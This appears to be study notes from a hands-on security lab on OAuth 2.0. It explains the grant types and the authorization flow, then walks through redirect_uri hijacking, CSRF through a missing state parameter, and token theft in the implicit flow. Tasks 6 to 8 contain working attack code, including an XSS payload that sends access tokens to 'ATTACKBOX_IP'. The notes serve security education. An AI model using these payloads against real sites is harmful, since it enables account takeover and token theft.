# TASK 3 OAuth Grant Types

## Authorization Code Grant
The Authorization Code grant is the most commonly used OAuth 2.0 flow suited for server-side applications (PHP, JAVA, .NET, etc.). 
1. The client redirects the user to the authorization server.
2. The user authenticates and grants authorization.
3. The authorization server redirects the user to the client with an authorization code.
4. The client exchanges the authorization code for an access token by requesting the authorization server's token endpoint.

This grant type is known for its enhanced security:
- The authorization code is exchanged for an access token server-to-server.
- The access token is not exposed to the user agent (e.g., browser), reducing the risk of token leakage.
- It supports using refresh tokens to maintain long-term access without repeated user authentication.

## Implicit Grant
The Implicit grant is primarily designed for mobile and web applications where clients cannot securely store secrets. 
It directly issues the access token to the client without requiring an authorization code exchange. 
1. The client redirects the user to the authorization server.
2. The user authenticates and grants authorization.
3. The authorization server returns an access token in the URL fragment.

Strengths:
- Simplified and suitable for clients who cannot securely store client secrets.
- Faster as it involves fewer steps than the authorization code grant.

Weaknesses:
- Less secure as the access token is exposed to the user agent and can be logged in the browser history.
- Does not support refresh tokens.

## Resource Owner Password Credentials Grant
The Resource Owner Password Credentials grant is used when the client is highly trusted by the resource owner, such as first-party applications. 
1. The client collects the user's credentials (username and password) directly.
2. The client exchanges the credentials for an access token by sending them to the authorization server.
3. The authorization server verifies the credentials and issues an access token.

Strengths:
- Direct grant type requiring fewer interactions.
- Suitable for highly trusted applications where users confidently share credentials.

Weaknesses:
- Less secure due to direct credential sharing with the client.
- Unsuitable for third-party applications.

## Client Credentials Grant
The Client Credentials grant is used for server-to-server interactions without user involvement. In this flow:

1. The client authenticates with the authorization server using its client credentials (client ID and secret).
2. The authorization server validates the client credentials.
3. Upon successful validation, the authorization server issues an access token directly to the client.

Strengths:
- Suitable for backend services and server-to-server communication.
- Does not involve user credentials, reducing security risks related to user data exposure.

Weaknesses:
- Limited to scenarios where user authentication is not required.

---

# TASK 4 How OAuth Flow Work

## 1. Authorization Request
Tom visits http://bistro.thm:8000/oauthdemo and clicks "Login via OAuth." 
CoffeeShopApp redirects his browser to the authorization server with an authorization request. 
http://coffee.thm:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback

The bistro website redirects Tom to the authorization server with these parameters:
- response_type=code    : This indicates that CoffeeShopApp is expecting an authorization code in return.
- state                 : A CSRF token to ensure that the request and response are part of the same transaction.
- client_id             : A public identifier for the client application, uniquely identifying CoffeeShopApp.
- redirect_uri          : The URL where the authorization server will send Tom after he grants permission. This must match one of the pre-registered redirect URIs for the client application.
- scope                 : Specifies the level of access requested, such as viewing coffee orders.

By including these parameters, the bistro app ensures that the authorization server understands what is requested and where to send the user afterwards.

Here is the Python code that redirects the user to the authorization server:

```python
/*************************************************************************************
* def oauth_login(request):
*     app = Application.objects.get(name="CoffeeApp")
*     redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
*     
*     authorization_url = (
*         f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
*     )
*     return redirect(authorization_url)
*************************************************************************************/
```

## 2. Authentication & Authorization
Tom logs in to the authorization server to verify his identity. 
After authentication, he consents to grant the bistro app access to his data, ensuring transparency and control.

1. User Login       : Tom enters his username and password on the authorization server's login page.
2. Consent Prompt   : After authentication, the authorization server presents Tom with a consent screen detailing what CoffeeShopApp requests access to (e.g., viewing his coffee orders). Tom must then decide whether to grant or deny these permissions.

This process ensures Tom's identity is verified and his consent obtained, maintaining security and user control over data.

## 3. Authorization Response
If Tom consents, the authorization server issues an authorization code and redirects him to the bistro website via the redirect_uri, including the code and state parameter to maintain flow integrity.

The authorization server responds with the following:
- code    : CoffeeShopApp will use the authorization code to request an access token.
- state   : The CSRF token previously sent by CoffeeShopApp to validate the response.

An example authorization response would be:
https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123

This step ensures the authorization process is secure, linking the response to the bistro's initial request. 
The authorization code acts as a temporary token for CoffeeShopApp to access Tom's profile details.

## 4. Token Request
The bistro website exchanges the authorization code for an access token by sending a POST request to the authorization server's token endpoint with these parameters:
- grant_type                  : Specifies the grant type (e.g., `authorization_code`).
- code                        : The authorization code received earlier.
- redirect_uri                : Must match the URI used in the authorization request.
- client_id and client_secret : Authenticate the client application.

Using the above parameters, the following code will make a token request to /o/token endpoint.

```python
/*************************************************************************************
* token_url = "http://coffee.thm:8000/o/token/"
* client_id = Application.objects.get(name="CoffeeApp").client_id
* client_secret = Application.objects.get(name="CoffeeApp").client_secret
* redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
*
* data = {
*     "grant_type": "authorization_code",
*     "code": code,
*     "redirect_uri": redirect_uri,
*     "client_id": client_id,
*     "client_secret": client_secret,
* }
*
* headers = {
*     'Content-Type': 'application/x-www-form-urlencoded',
*     'Authorization': f'Basic {base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()}',
* }
*
* response = requests.post(token_url, data=data, headers=headers)
* tokens = response.json()
*************************************************************************************/
```

The bistro app securely exchanges the authorization code for an access token, enabling access to Tom's profile details after server validation.

## 5. Token Response
The authorization server validates the authorization code and client credentials, then responds with an access token and optionally a refresh token.

The authorization server's response includes the following:

- access_token: Token that will be used to access Tom's details.
- token_type: Typically "Bearer".
- expires_in: The duration in seconds for which the access token is valid.
- refresh_token (optional): A token used to obtain new access tokens without requiring the user to log in again.

With the access token, the bistro website can authenticate requests to the resource server to access Tom's profile. The refresh token allows obtaining new access tokens without repeated logins, ensuring a seamless user experience.
The OAuth 2.0 workflow is complete. The access token enables the bistro website to make authenticated requests to the resource server, including the token in the authorization header for secure access.

---

# TASK 5 Identifying the OAuth Services

## Detecting OAuth Frameworks
- Login Options    : Look for external service providers (e.g., Google, Facebook) during login.
- Network Traffic  : Check for redirects to authorization server URLs with parameters like response_type, client_id, redirect_uri, scope, and state.

Example URL:
https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123

## Identifying OAuth Framework
- HTTP Headers    : Inspect headers and responses for framework-specific identifiers.
- Source Code     : Search for libraries like django-oauth-toolkit, oauthlib, or passport.
- Endpoints       : Analyze patterns like /oauth/authorize/ or /oauth/token/.
- Error Messages  : Look for debug output revealing the technology stack.

---

# TASK 6 Exploiting OAuth - Stealing OAuth Token

## English
An attacker creates a malicious HTML form and tricks the victim into filling it out.
The victim's credentials are sent to the target website's server for authentication, and the server issues an authorization code.
However, instead of the authorization code being sent to the proper OAuth provider, it is redirected to the attacker's website.
The attacker then uses the stolen authorization code to retrieve an access token from the target website's server.

## Overview
Tokens are vital in OAuth 2.0, granting access to protected resources. 
Issued by the authorization server, they are sent to the client via the redirect_uri. 
A poorly secured redirect_uri can be exploited, risking token hijacking.

## Role of Redirect_URI
The redirect_uri parameter specifies where the authorization server sends the token post-authorization. 
It must match a pre-registered URI to prevent open redirect vulnerabilities.

## Vulnerability
An insecure redirect_uri can lead to severe security issues. 
If attackers gain control over any domain or URI listed in the redirect_uri, they can manipulate the flow to intercept tokens.
- Attacker's Strategy :   If an attacker gains control over dev.bistro.thm, they can exploit the OAuth flow. 
                        By setting the redirect_uri to http://dev.bistro.thm/callback, the authorization server will send the token to this controlled domain.
- Crafted Attack      :   The attacker initiates an OAuth flow and ensures the redirect_uri points to their controlled domain. After the user authorizes the application, the token is sent to http://dev.bistro.thm/callback. The attacker can now capture this token and use it to access protected resources.

## Preparing the Payload (Attacker Perspective)
Before starting the exercise, please ensure you are logged out of the OAuth provider as a victim by visiting the link http://coffee.thm:8000/admin/logout.

For this exercise, we assume that the attacker has compromised the domain dev.bistro.thm:8002 and can host any HTML page on the server. 
Consider Tom, a victim to whom we will send a link. 
The attacker can craft a simple HTML page (redirect_uri.html) with the following code:

```html
/************************************************************************************
* <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
*     <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
*     <input type="submit" value="Hijack OAuth">
* </form>
************************************************************************************/
```

This form sends a hidden redirect_uri parameter with the value http://dev.bistro.thm:8002/malicious_redirect.html and submits a request to http://coffee.thm:8000/oauthdemo/oauth_login/. 
The malicious_redirect.html page then intercepts the authorization code from the URL using the following code:

```javascript
/************************************************************************************
* <script>
*     // Extract the authorization code from the URL
*     const urlParams = new URLSearchParams(window.location.search);
*     const code = urlParams.get('code');
*     document.getElementById('auth_code').innerText = code;
*     console.log("Intercepted Authorization Code:", code);
*     // code to save the acquired code in database/file etc
* </script>
************************************************************************************/
```

Note:   The attacker, controlling the subdomain, can intercept and save the authorization code for later use. 
        The redirection happens so quickly that the victim remains unaware of the hijacking.

The attacker can send Tom a crafted link (http://dev.bistro.thm:8002/redirect_uri.html) via social engineering or CSRF. 
When Tom clicks the link, it redirects to dev.bistro.thm:8002/redirect_uri.html. 
In the VM, open the link as a victim to observe the attack in action.

In the VM, when the victim clicks "Login via OAuth," the form sends a falsified redirect_uri to http://coffee.thm:8000/oauthdemo/oauth_login/. 
After entering credentials (victim:victim123), the OAuth authorization code is sent to the attacker's URL (http://dev.bistro.thm:8002/malicious_redirect.html), enabling interception and misuse.

---

# TASK 7 Exploiting OAuth - CSRF in OAuth

## English
Attacker first obtains a legitimate "permission code" from the login system using their own account.
Attacker crafts a link containing the permission code and points it to the victim's site.
The victim clicks the link and the site accepts the permission code without checking it properly.
Because the site didn't verify the request (it's missing the "state" safety token), it treats the attacker's code as if the victim approved it and links the attacker's account to the victim's account.
Attacker now receives the victim's data (contacts, messages, etc.) or can act on the victim's behalf.

## Overview
The state parameter in OAuth 2.0 prevents CSRF attacks by ensuring the integrity of the authorization process. 
It links the request and response, protecting against unauthorized access to sensitive resources.

## Vulnerability of Weak or Missing State Parameter
The state parameter ensures the integrity of the OAuth flow by linking requests and responses. 
If missing or predictable, attackers can exploit this to redirect authorization codes to malicious URIs, enabling CSRF attacks.

## Attacker Perspective
First, visit the website in the AttackBox using the link http://mycontacts.thm:8080/csrf/index.php with the credentials attacker:attacker. 
After logging in, sync contacts to CoffeeShopApp. 
This transfers all current accounts from the client app to the CoffeeShopApp account.

If you click on the "Sync Contacts" button, you will be redirected to an OAuth authorization server with the URL:
http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Fcoffee.thm%2Fcsrf%2Fcallbackcsrf.php.

As a pentester, observe that the authorization URL lacks the state parameter, making it vulnerable to CSRF attacks. 
Exploit this by linking the attacker's third-party account to the victim's account without syncing your actual account.

## Exploiting the Vulnerability
Without the state parameter, the authorization process is vulnerable to CSRF. 
An attacker can exploit this by obtaining the victim's authorization code and sending it to themselves. 
The authorization server cannot differentiate between the attacker and the victim, enabling unauthorized access.

## Preparing the Payload
To prepare the payload, the attacker must obtain their authorization code. 
This can be achieved by intercepting the authorization process using tools like Burp Suite or similar. 
For this exercise, use the provided link:
http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/.

This allows you to get your authorization code without completing the OAuth flow. The code for the flow is as follows:

```python
/*************************************************************************************
* def oauth_logincsrf(request):
*     app = Application.objects.get(name="ContactApp")
*     redirect_uri = request.POST.get("redirect_uri", "http://coffee.thm/csrf/callbackcsrf.php") 
*     
*     authorization_url = (
*         f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
*     )
*     return redirect(authorization_url)
*
* def oauth_callbackflagcsrf(request):
*     code = request.GET.get("code")
*     
*     if not code:
*         return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) 
*
*     if code:
*         return JsonResponse({'code': code, 'Payload': 'http://coffee.thm/csrf/callbackcsrf.php?code='+code}, status=400) 
*************************************************************************************/
```

Visiting the shared link with credentials attacker:tesla@123 provides an authorization code. 
This code can be used to obtain an access token. Copy the Payload value from the response for use in the attack.

## Launching the Attack
Once the attacker has obtained the authorization code, they can prepare the CSRF payload. 
For example, the attacker might send the victim an email containing a link like:
http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx.

After clicking the crafted link (where xxx is the attacker's authorization code), the victim unknowingly links the attacker's CoffeeShopApp OAuth account to their own, transferring all contacts to the attacker.

## Victim Perspective
In the attached VM, to practically test it as a victim, log into the client app at:
http://bistro.thm:8080/csrf/.

Use the credentials victim:victim. 
Execute the attacker exploit by visiting the crafted link (e.g., http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx) directly in the browser.

The crafted link sent to the victim is the URL parameter obtained during the Preparing the Payload step. 
Upon execution, it retrieves the access token and transfers contacts/messages to the attacker's account.

---

# TASK 8 Exploiting OAuth Implicit Grant Flow

## English
Victim logs in to a website to let a second app post on their behalf.
Instead of sending a code, the login system returns the access token directly to the browser (in the page URL).
That token is like a temporary key that lets anyone act as the victim.
If the page has a hidden flaw or an attacker tricks victim into visiting a malicious page, a small script can read the token from the URL and send it to attacker.
Attacker now uses the token to access victim's account without needing the password.

## Overview
In the implicit grant flow, tokens are returned directly to the client via the browser, bypassing the need for an authorization code. 
This flow is suited for single-page applications but is inherently vulnerable due to token exposure and lack of secure client authentication.

## Weaknesses
- Access Token in URL: Token is returned in the URL fragment, accessible by scripts on the page.
- Weak Redirect URI Validation: OAuth server allows manipulation of redirection endpoints.
- No HTTPS: Lack of HTTPS enables token interception via man-in-the-middle attacks.
- Insecure Token Storage: Tokens stored insecurely (e.g., localStorage) are vulnerable to XSS.

## Deprecation of Implicit Grant Flow
Due to these vulnerabilities, the OAuth 2.0 Security Best Current Practice recommends deprecating the implicit grant flow in favor of the authorization code flow with Proof Key for Code Exchange (PKCE). 
This updated flow enhances security by mitigating token exposure risks and ensuring client authentication.

## Practical
In the VM, go to http://factbook.thm:8080. 
Click "Sync Statuses from CoffeeShopApp" to initiate the implicit grant flow. 
The access token will be returned directly to the client. The authorization URL is:

```javascript
/************************************************************************************
* var client_id = 'npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7';
* var redirect_uri = 'http://factbook.thm:8080/callback.php'; 
* var auth_url = "http://coffee.thm:8000/o/authorize/";
* var url = auth_url + "?response_type=token&client_id=" + client_id + "&redirect_uri=" + encodeURIComponent(redirect_uri);
* window.location.href = url;
************************************************************************************/
```

## Victim Perspective
Once the user authenticates using the OAuth provider credentials victim:victim123, they are redirected to callback.php, where they can submit a status via a form using AJAX.

```php
/************************************************************************************
* <button class="btn btn-primary" onclick="submitStatus()">Submit</button>
* <h2 class="mt-4">Submitted Status</h2>
* <ul class="list-group" id="status-list">
*     <?php
*     session_start();
*     if (isset($_POST['status'])) {
*         $status = $_POST['status'];
*         if (!isset($_SESSION['statuses'])) {
*             $_SESSION['statuses'] = [];
*         }
*         $_SESSION['statuses'][] = $status;
*         header('Content-Type: application/json');
*         echo json_encode(['status' => $status]);
*         exit();
*     }
*     // Display previously stored statuses
*     if (isset($_SESSION['statuses'])) {
*         foreach ($_SESSION['statuses'] as $status) {
*             echo '<li class="list-group-item">' . $status . '</li>';
*         }
*     }
*     ?>
* </ul>
************************************************************************************/
```

For demonstration purposes, the status input field is vulnerable to XSS. 
Once you reach the status page and enter a status like "Hello", it will be published. 
However, if an attacker exploits this vulnerability, they can inject a malicious script.

## Attacker Perspective
To prepare for the attack, inside the Attackbox instance, run a Python HTTP server to listen on port 8081 using the command python3 -m http.server 8081. 
If you encounter a "Port already in use" error, please try using a different port number. 
The attacker will share the following payload with the victim that they will enter as status (assume using social engineering):

```javascript
/************************************************************************************
* <script>
* var hash = window.location.hash.substr(1);
* var result = hash.split('&').reduce(function (res, item) {
*     var parts = item.split('=');
*     res[parts[0]] = parts[1];
*     return res;
* }, {});
* var accessToken = result.access_token;
* var img = new Image();
* img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
* </script>
************************************************************************************/
```

Let's dissect the payload:
- Extracts the URL fragment (after #) and removes the leading #.
- Splits the fragment by & into key-value pairs and processes them into an object.
- Retrieves the access_token from the object and assigns it to accessToken.
- Creates an Image object and sets its src to the attacker's server URL with the token as a query parameter.
- Sends the token to the attacker's server when the image is loaded.

Copy the XSS payload into the victim's status input field. 
Upon page refresh, the payload extracts the access token from the URL fragment and sends it to the attacker's server (http://ATTACKBOX_IP:8081/steal_token), enabling unauthorized access.

Note: Refresh the page in order to visualize what the victim sees and to retrieve the token.

Example Terminal Output:

```bash
/************************************************************************************
* root@ip-10-10-162-175:~# python3 -m http.server 8081
* Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
* 10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found
* 10.9.2.217 - - [27/Aug/2024 19:30:10] "GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1" 404 -
************************************************************************************/
```

## Conclusion
The implicit grant type is highly vulnerable as the access token is exposed in the URL fragment, accessible to scripts on the page. 
Without HTTPS, tokens can be intercepted via man-in-the-middle attacks.

---

# Appendix